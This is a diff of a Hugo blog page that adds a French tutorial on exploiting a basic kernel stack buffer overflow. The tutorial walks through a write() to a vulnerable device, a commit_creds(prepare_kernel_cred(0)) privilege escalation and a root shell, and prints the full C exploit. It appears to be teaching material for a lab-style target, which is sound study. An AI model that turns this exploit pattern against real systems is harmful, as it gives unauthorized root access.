@@ -5,24 +5,45 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
-    <title>All Kernel/ - MyLittlePwney</title><meta name="author" content="">
+    <title>Buffer Overflow Basic - MyLittlePwney</title><meta name="author" content="">
 <meta name="author-link" content="">
-<meta name="description" content="fa-solid fa-gear fa-fw fa-sm" /><meta itemprop="name" content="Kernel/">
-<meta itemprop="description" content="fa-solid fa-gear fa-fw fa-sm"><meta property="og:title" content="Kernel/" />
-<meta property="og:description" content="fa-solid fa-gear fa-fw fa-sm" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://0xeg0.github.io/MyLittlePwney/pwn/kernel/" /><meta property="og:image" content="https://0xeg0.github.io/image/logo.png" />
+<meta name="description" content="Technique pour exploiter un buffer overflow basique côté kernel." /><meta name="keywords" content='pwn, kernel' /><meta itemprop="name" content="Buffer Overflow Basic">
+<meta itemprop="description" content="Technique pour exploiter un buffer overflow basique côté kernel."><meta itemprop="datePublished" content="2024-02-21T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2024-02-21T00:00:00+00:00" />
+<meta itemprop="wordCount" content="511"><meta itemprop="image" content="https://0xeg0.github.io/image/logo.png" />
+<meta itemprop="keywords" content="pwn,kernel," /><meta property="og:title" content="Buffer Overflow Basic" />
+<meta property="og:description" content="Technique pour exploiter un buffer overflow basique côté kernel." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xeg0.github.io/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/" /><meta property="og:image" content="https://0xeg0.github.io/image/logo.png" /><meta property="article:section" content="pwn" />
+<meta property="article:published_time" content="2024-02-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-02-21T00:00:00+00:00" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://0xeg0.github.io/image/logo.png" /><meta name="twitter:title" content="Kernel/"/>
-<meta name="twitter:description" content="fa-solid fa-gear fa-fw fa-sm"/>
+<meta name="twitter:image" content="https://0xeg0.github.io/image/logo.png" /><meta name="twitter:title" content="Buffer Overflow Basic"/>
+<meta name="twitter:description" content="Technique pour exploiter un buffer overflow basique côté kernel."/>
 <meta name="application-name" content="FixIt">
 <meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://0xeg0.github.io/MyLittlePwney/pwn/kernel/" /><link rel="alternate" href="/MyLittlePwney/pwn/kernel/index.xml" type="application/rss+xml" title="MyLittlePwney">
-  <link rel="feed" href="/MyLittlePwney/pwn/kernel/index.xml" type="application/rss+xml" title="MyLittlePwney"><link rel="stylesheet" href="/MyLittlePwney/css/style.min.css"><link rel="preload" href="/MyLittlePwney/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://0xeg0.github.io/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/" /><link rel="prev" href="https://0xeg0.github.io/MyLittlePwney/pwn/kernel/kernel-privesc/" /><link rel="stylesheet" href="/MyLittlePwney/css/style.min.css"><link rel="preload" href="/MyLittlePwney/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/MyLittlePwney/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/MyLittlePwney/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="/MyLittlePwney/lib/animate/animate.min.css"></noscript><link rel="stylesheet" type="" href="/MyLittlePwney/css/custom.css">
+    <noscript><link rel="stylesheet" href="/MyLittlePwney/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Buffer Overflow Basic",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/0xeg0.github.io\/MyLittlePwney\/pwn\/kernel\/attacks\/buffer-overflow-basic\/"
+    },"genre": "pwn","keywords": "pwn, kernel","wordcount":  511 ,
+    "url": "https:\/\/0xeg0.github.io\/MyLittlePwney\/pwn\/kernel\/attacks\/buffer-overflow-basic\/","datePublished": "2024-02-21T00:00:00+00:00","dateModified": "2024-02-21T00:00:00+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Author"
+      },"description": "Technique pour exploiter un buffer overflow basique côté kernel."
+  }
+  </script><link rel="stylesheet" type="" href="/MyLittlePwney/css/custom.css">
   </head>
   <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper" data-github-corner="right">
@@ -91,7 +112,7 @@
                           
                         ><i class="fa-solid fa-microchip fa-fw fa-sm" aria-hidden="true"></i> Shellcoding</a>
                       </li><li
-                        class="menu-item active"
+                        class="menu-item"
                       >
                         <a
                           class="menu-link"
@@ -404,7 +425,7 @@
                           
                         ><i class="fa-solid fa-microchip fa-fw fa-sm" aria-hidden="true"></i> Shellcoding</a>
                       </li><li
-                        class="menu-item active"
+                        class="menu-item"
                       >
                         <a
                           class="menu-link"
@@ -624,16 +645,189 @@
   </div>
   <div class="search-dropdown mobile">
     <div id="search-dropdown-mobile"></div>
-  </div><main class="container"><div class="page archive">
-    <div class="header"><h1 class="single-title animate__animated animate__pulse animate__faster"><i class="fa-solid fa-bbbug fa-fw me-1" aria-hidden="true"></i>Kernel/ </sup>
-      </h1>
-    </div><h2 class="group-title">
-          . /
-        </h2><article class="archive-item">
-              <a href="/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/" class="archive-item-link">Buffer Overflow Basic</a>
-            </article><article class="archive-item">
-              <a href="/MyLittlePwney/pwn/kernel/kernel-privesc/" class="archive-item-link">🪜 Kernel Privesc 🪜</a>
-            </article><hr/></div></main><footer class="footer">
+  </div><main class="container"><article class="page single special">
+    <div class="header"><h1 class="single-title animate__animated animate__pulse animate__faster">Buffer Overflow Basic</h1></div><div
+      class="content"
+      id="content"
+      
+      
+    ><h2 id="overview" class="heading-element">
+  <a href="#overview" class="heading-mark"></a>Overview</h2><p>Tout comme pour une exploitation de <strong>BoF</strong> en user-land, notre objectif va être d&rsquo;overwrite la return address de la fonction vulnérable pour prendre le contrôle du flow d&rsquo;exécution.
+On se place ici dans le cas où aucune protection n&rsquo;est présente au niveau du kernel.</p>
+<h2 id="detail" class="heading-element">
+  <a href="#detail" class="heading-mark"></a>Detail</h2><p>Notre objectif lors de l&rsquo;exploitation d&rsquo;un buffer overflow en kernel-land est de réussir a exécuter du code user-land tout en profitant de l&rsquo;exécution de code kernel-land pour <a href="/MyLittlePwney/pwn/kernel/kernel-privesc">élever nos privilèges</a>.</p>
+<p>Ainsi, un schéma d&rsquo;attaque classique nous donnerait :</p>
+<ol>
+<li>Exploiter le buffer overflow.</li>
+<li>Overwrite l&rsquo;adresse de retour de la fonction vulnérable par l&rsquo;adresse de la fonction <em>privesc()</em>.
+<ul>
+<li><em>privesc()</em> passe les privilèges du process, lancé par notre binaire <em>exploit</em>, a root.</li>
+</ul>
+</li>
+<li>Maintenant qu&rsquo;on a des privilèges root, on peut lancer un <em>system(&quot;/bin/sh&quot;)</em>.
+<img loading="lazy" src="/MyLittlePwney/MyLittlePwney/images/kernel_bof.png" alt="task_struct" srcset="/MyLittlePwney/images/kernel_bof.png?size=small, /MyLittlePwney/images/kernel_bof.png?size=medium 1.5x, /MyLittlePwney/images/kernel_bof.png?size=large 2x" sizes="auto" data-title="task_struct" style="background: url(/MyLittlePwney/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></li>
+</ol>
+<h2 id="exploit" class="heading-element">
+  <a href="#exploit" class="heading-mark"></a>Exploit</h2><p>Pour implémenter cette attaque, on va se mettre dans le cas où on peut interagir avec une device, dont la propriété <strong>write</strong> fait appel à une fonction vulnérable à un buffer overflow. Ainsi, lorsque l&rsquo;on va <em>write()</em> plus de caractères qu&rsquo;attendu, on va overflow sur la stack kernel.</p>
+<p>Pour exploiter cela, on va tout d&rsquo;abord devoir ouvrir la device pour interagir avec elle.</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="n">global_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/vulnDevice&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ensuite on va préparer notre fonction <em>privesc()</em> que l&rsquo;on va appeler une fois avoir pris le contrôle sur le flow d&rsquo;exécution côté kernel.</p>
+<table>
+<thead>
+<tr>
+<th>Pour mieux comprendre le principe de l&rsquo;élévation de privilèges côté kernel, allez voir : <a href="/MyLittlePwney/pwn/kernel/kernel-privesc">Kernel Privesc</a>.</th>
+</tr>
+</thead>
+</table>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="nf">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="nf">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">privesc</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xc107</span><span class="p">...;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xc107</span><span class="p">...;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">commit_creds</span><span class="p">(</span><span class="nf">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Maintenant qu&rsquo;on a la fonction qui va nous permettre d&rsquo;élever nos privilèges, on va pouvoir overflow sur la stack kernel et rediriger le flow d&rsquo;exécution vers cette fonction.</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Overlow at 64 bytes
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="n">payload</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">privesc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Grâce à cet exploit, nous avons manipulé le kernel pour qu&rsquo;il passe le process spawn par <em>exploit</em> en tant que process root. Il ne nous reste plus qu&rsquo;à run un <em>system(&quot;/bin/sh&quot;)</em> pour obtenir un shell root.</p>
+<p>En résumé, notre exploit final donne quelque chose comme :</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="nf">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="nf">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cred</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="n">global_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/vulnDevice&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">privesc</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xc107</span><span class="p">...;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xc107</span><span class="p">...;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">commit_creds</span><span class="p">(</span><span class="nf">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="n">payload</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">privesc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">open_dev</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">overflow</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div></article></main><footer class="footer">
     <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.122.0"><img class="hugo-icon" src="/MyLittlePwney/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2-RC"><img class="fixit-icon" src="/MyLittlePwney/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
@@ -643,7 +837,7 @@
     <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
   </noscript>
 </div><link rel="preload" href="/MyLittlePwney/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="/MyLittlePwney/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/MyLittlePwney/lib/cookieconsent/cookieconsent.min.css"><script src="/MyLittlePwney/lib/autocomplete/autocomplete.min.js" defer></script><script src="/MyLittlePwney/lib/fuse/fuse.min.js" defer></script><script src="/MyLittlePwney/lib/sharer/sharer.min.js" async defer></script><script src="/MyLittlePwney/lib/katex/katex.min.js" defer></script><script src="/MyLittlePwney/lib/katex/auto-render.min.js" defer></script><script src="/MyLittlePwney/lib/katex/copy-tex.min.js" defer></script><script src="/MyLittlePwney/lib/katex/mhchem.min.js" defer></script><script src="/MyLittlePwney/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/MyLittlePwney/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false}};</script><script src="/MyLittlePwney/js/theme.min.js" defer></script><script>
+    <noscript><link rel="stylesheet" href="/MyLittlePwney/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/MyLittlePwney/lib/cookieconsent/cookieconsent.min.css"><script src="/MyLittlePwney/lib/autocomplete/autocomplete.min.js" defer></script><script src="/MyLittlePwney/lib/fuse/fuse.min.js" defer></script><script src="/MyLittlePwney/lib/sharer/sharer.min.js" async defer></script><script src="/MyLittlePwney/lib/katex/katex.min.js" defer></script><script src="/MyLittlePwney/lib/katex/auto-render.min.js" defer></script><script src="/MyLittlePwney/lib/katex/copy-tex.min.js" defer></script><script src="/MyLittlePwney/lib/katex/mhchem.min.js" defer></script><script src="/MyLittlePwney/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/MyLittlePwney/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false}};</script><script src="/MyLittlePwney/js/theme.min.js" defer></script><script>
       window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
       gtag('config', 'G-E5LRZC34M1', { 'anonymize_ip': true });
     </script><script src="https://www.googletagmanager.com/gtag/js?id=G-E5LRZC34M1" async></script></body>
